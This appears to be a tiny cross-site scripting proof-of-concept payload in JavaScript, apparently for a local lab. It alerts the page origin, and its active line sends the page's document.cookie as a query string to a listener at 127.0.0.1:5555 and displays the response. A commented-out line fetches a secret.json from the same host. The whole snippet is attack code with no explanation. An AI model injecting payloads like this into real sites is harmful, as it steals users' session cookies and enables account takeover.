alert(`Executed as ${origin}`)
// fetch(`http://127.0.0.1:5555/secret.json`).then(res => res.json()).then(data=>alert(data.secret)).catch(error=>alert(error))
fetch(`http://127.0.0.1:5555/script.js?${document.cookie}`).then(res => res.text()).then(data=>alert(data)).catch(error=>alert(error))